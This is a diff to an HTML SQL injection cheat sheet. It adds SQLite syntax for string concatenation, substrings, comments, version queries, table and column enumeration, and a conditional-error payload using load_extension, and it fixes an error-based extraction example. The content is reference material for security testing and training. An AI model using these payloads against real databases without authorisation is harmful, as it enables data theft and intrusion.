@@ -1,5 +1,7 @@
 <h1>SQL injection cheat sheet</h1><p>
     This <a href="https://portswigger.net/web-security/sql-injection">SQL injection</a> cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
+
+    Also checkout [SQL Injection from PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection).
 </p>
 
 <h2>String concatenation</h2>
@@ -36,6 +38,16 @@
             <code>CONCAT('foo','bar')</code>
         </td>
     </tr>
+    <tr>
+        <th>
+            SQLite
+        </th>
+        <td>
+            <code>'foo' || 'bar'</code> [Note the space between the two strings] <br />
+            <code>CONCAT('foo','bar')</code>
+        </td>
+    </tr>
+
 </table>
 
 <h2>Substring</h2>
@@ -71,6 +83,14 @@
         </th>
         <td>
             <code>SUBSTRING('foobar', 4, 2)</code>
+        </td>
+    </tr>
+    <tr>
+        <th>
+            SQLite
+        </th>
+        <td>
+            <code>SUBSTR('foobar', 4, 2)</code>
         </td>
     </tr>
 </table>
@@ -116,6 +136,15 @@
             <code>/*comment*/</code>
         </td>
     </tr>
+    <tr>
+        <th>
+            SQLite
+        </th>
+        <td>
+            <code>--comment</code><br/>
+            <code>/*comment*/</code>
+        </td>
+    </tr>
 </table>
 
 <h2>Database version</h2>
@@ -154,6 +183,15 @@
         </th>
         <td>
             <code>SELECT @@version</code>
+        </td>
+    </tr>
+    <tr>
+        <th>
+            SQLite
+        </th>
+        <td>
+            <code>SELECT sqlite_version()</code>
+            <code>SELECT sqlite_source_id()</code>
         </td>
     </tr>
 </table>
@@ -197,6 +235,15 @@
         <td>
             <code>SELECT * FROM information_schema.tables</code><br />
             <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+        </td>
+    </tr>
+    <tr>
+        <th>
+            SQLite
+        </th>
+        <td>
+            <code>SELECT name FROM sqlite_master WHERE type='table'</code><br />
+            <code>SELECT name FROM PRAGMA_TABLE_INFO('TABLE-NAME-HERE')</code>
         </td>
     </tr>
 </table>
@@ -247,6 +294,14 @@
             <code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code>
         </td>
     </tr>
+    <tr>
+        <th>
+            SQLite
+        </th>
+        <td>
+            <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN load_extension(1) ELSE 'a' END</code>
+        </td>
+    </tr>
 </table>
 
 <h2>Extracting data via visible error messages</h2>
@@ -278,7 +333,7 @@
         </th>
         <td>
             <code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code><br />
-            </code>&gt; XPATH syntax error: '\secret'</code>
+            <code>&gt; XPATH syntax error: '\secret'</code>
         </td>
     </tr>
 </table>
